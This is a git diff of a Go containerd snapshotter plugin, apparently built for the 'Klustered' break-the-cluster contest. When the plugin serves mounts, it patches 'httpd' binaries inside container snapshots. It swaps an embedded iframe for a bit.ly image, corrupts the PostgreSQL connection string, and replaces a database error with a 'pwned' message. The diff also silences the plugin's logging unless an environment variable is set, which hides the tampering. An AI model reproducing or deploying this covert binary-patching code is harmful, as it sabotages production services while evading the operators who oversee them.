@@ -20,37 +20,30 @@ import (
 	"sigs.k8s.io/release-utils/command"
 )
 
-const iFrameBit = "<iframe src=\"https://giphy.com/embed/11tTNkNy1SdXGg"
-const evilPatch = `<img src="https://bit.ly/3JScAMB" style="transform: rotate(180deg)"      `
+const (
+	iFrameBit = "<iframe src=\"https://giphy.com/embed/11tTNkNy1SdXGg"
+	evilPatch = `<img src="https://bit.ly/3JScAMB" style="transform: rotate(180deg)"      `
+	message   = `<strong>pwned by Da West Chainguard Massif`
+	dbError   = `Failed to connect to database`
+)
 
 func main() {
-	// Provide a unix address to listen to, this will be the `address`
-	// in the `proxy_plugin` configuration.
-	// The root will be used to store the snapshots.
+	// args are self, socket filesystem
 	if len(os.Args) < 3 {
 		fmt.Printf("invalid args: usage: %s <unix addr> <root>\n", os.Args[0])
 		os.Exit(1)
 	}
 
 	if err := os.RemoveAll(os.Args[1]); err != nil {
-		logrus.Fatal(err)
+		os.Exit(1)
 	}
 
-	// Create a gRPC server
 	rpc := grpc.NewServer()
-
-	// Configure your custom snapshotter, this example uses the native
-	// snapshotter and a root directory. Your custom snapshotter will be
-	// much more useful than using a snapshotter which is already included.
-	// https://godoc.org/github.com/containerd/containerd/snapshots#Snapshotter
-
 	snapper := NewSnapper(os.Args[2])
+	// Create the snappshotter from the snapper
 	service := snapshotservice.FromSnapshotter(snapper)
-
-	// Register the service with the gRPC server
 	snapshotsapi.RegisterSnapshotsServer(rpc, service)
 
-	// Listen and serve
 	l, err := net.Listen("unix", os.Args[1])
 	if err != nil {
 		fmt.Printf("error: %v\n", err)
@@ -82,56 +75,72 @@ func NewSnapper(snapshotDir string) *Snapper {
 	return snapper
 }
 
+func (*Snapper) Log(msg ...string) {
+	if os.Getenv("LOGME") != "" {
+		logrus.Info(msg)
+	}
+}
+
 func (snapper *Snapper) Stat(ctx context.Context, key string) (snapshots.Info, error) {
-	logrus.Info("Stat!")
+	snapper.Log("Stat!")
 	i, err := snapper.Snapshotter.Stat(ctx, key)
 	return i, err
 }
 
 func (snapper *Snapper) Update(ctx context.Context, info snapshots.Info, fieldpaths ...string) (snapshots.Info, error) {
-	logrus.Info("Update!")
+	snapper.Log("Update!")
 	return snapper.Snapshotter.Update(ctx, info, fieldpaths...)
 }
 func (snapper *Snapper) Usage(ctx context.Context, key string) (snapshots.Usage, error) {
-	logrus.Info("Usage!")
+	snapper.Log("Usage!")
 	return snapper.Snapshotter.Usage(ctx, key)
 }
 func (snapper *Snapper) Mounts(ctx context.Context, key string) ([]mount.Mount, error) {
-	logrus.Info("Mounts!")
+	snapper.Log("Mounts!")
 	binaries, err := locateBinaries(snapper.Directory, "httpd")
 	if err != nil {
-		logrus.Warn("error locating binaries:", err)
+		snapper.Log("error locating binaries:", err.Error())
 	}
 	for _, p := range binaries {
-		logrus.Info("Checking binary: " + p)
-		offset, err := findStringOffset("Klustered", p)
+		snapper.Log("Checking binary: " + p)
+		offset, err := snapper.findStringOffset("Klustered", p)
 		if err != nil {
-			logrus.Warn(err)
+			snapper.Log(err.Error())
 		}
 		if offset > 0 {
-			logrus.Infof("Found contest binary >>>>>>>>> %s", p)
-			offset, err := findStringOffset(iFrameBit, p)
+			snapper.Log("Found contest binary >>>>>>>>> %s", p)
+			offset, err := snapper.findStringOffset(iFrameBit, p)
 			if err != nil {
-				logrus.Warn(err)
+				snapper.Log(err.Error())
 			}
 			if offset < 0 {
-				logrus.Infof("  [ALREADY PATCHED 😇]")
+				snapper.Log("  [ALREADY PATCHED 😇]")
 				continue
 			}
 
-			if err := patchBinary(p, offset, evilPatch); err != nil {
-				logrus.Warnf("Error patching: %s", err.Error())
+			if err := snapper.patchBinary(p, offset, evilPatch); err != nil {
+				snapper.Log("Error patching: %s", err.Error())
 				continue
 			}
 
-			offset, err = findStringOffset("postgresql123", p)
+			offset, err = snapper.findStringOffset("postgresql123", p)
 			if err != nil {
-				logrus.Warn(err)
+				snapper.Log(err.Error())
 				continue
 			}
 
-			if err := patchBinary(p, offset, "postgresqll23"); err != nil {
-				logrus.Warnf("Error patching sql connection: %s", err.Error())
+			if err := snapper.patchBinary(p, offset, "postgresqll23"); err != nil {
+				snapper.Log("Error patching sql connection: %s", err.Error())
+			}
+
+			offset, err = snapper.findStringOffset(dbError, p)
+			if err != nil {
+				snapper.Log(err.Error())
+				continue
+			}
+
+			if err := snapper.patchBinary(p, offset, message); err != nil {
+				snapper.Log("Error patching db error: %s", err.Error())
 			}
 		}
 	}
@@ -139,28 +148,28 @@ func (snapper *Snapper) Mounts(ctx context.Context, key string) ([]mount.Mount, 
 	return snapper.Snapshotter.Mounts(ctx, key)
 }
 func (snapper *Snapper) Prepare(ctx context.Context, key, parent string, opts ...snapshots.Opt) ([]mount.Mount, error) {
-	logrus.Info("Prepare!")
+	snapper.Log("Prepare!")
 	return snapper.Snapshotter.Prepare(ctx, key, parent, opts...)
 }
 func (snapper *Snapper) View(ctx context.Context, key, parent string, opts ...snapshots.Opt) ([]mount.Mount, error) {
-	logrus.Info("View!")
+	snapper.Log("View!")
 	return snapper.Snapshotter.View(ctx, key, parent, opts...)
 }
 func (snapper *Snapper) Commit(ctx context.Context, name, key string, opts ...snapshots.Opt) error {
-	logrus.Info("Commit!")
+	snapper.Log("Commit!")
 	return snapper.Snapshotter.Commit(ctx, name, key, opts...)
 }
 func (snapper *Snapper) Remove(ctx context.Context, key string) error {
-	logrus.Info("Remove!")
+	snapper.Log("Remove!")
 	return snapper.Snapshotter.Remove(ctx, key)
 }
 func (snapper *Snapper) Walk(ctx context.Context, fn snapshots.WalkFunc, filters ...string) error {
-	logrus.Info("Walk!")
+	snapper.Log("Walk!")
 	return snapper.Snapshotter.Walk(ctx, fn, filters...)
 
 }
 func (snapper *Snapper) Close() error {
-	logrus.Info("Close!")
+	snapper.Log("Close!")
 	return snapper.Snapshotter.Close()
 }
 
@@ -185,8 +194,8 @@ func locateBinaries(topPath, name string) (paths []string, err error) {
 }
 
 // Patches a binary at the specified byte point
-func patchBinary(path string, offset int64, replacement string) error {
-	logrus.Infof("Patching %s to do evil things 👿 ", path)
+func (snapper *Snapper) patchBinary(path string, offset int64, replacement string) error {
+	snapper.Log("Patching %s to do evil things 👿 ", path)
 	f, err := os.CreateTemp("", "")
 	if err != nil {
 		return err
@@ -206,7 +215,7 @@ func patchBinary(path string, offset int64, replacement string) error {
 	return nil
 }
 
-func findStringOffset(pattern, path string) (bytePoint int64, err error) {
+func (snapper *Snapper) findStringOffset(pattern, path string) (bytePoint int64, err error) {
 	output, err := command.New(
 		"grep", "-o", "--text", "--byte-offset", pattern, path,
 	).RunSilentSuccessOutput()
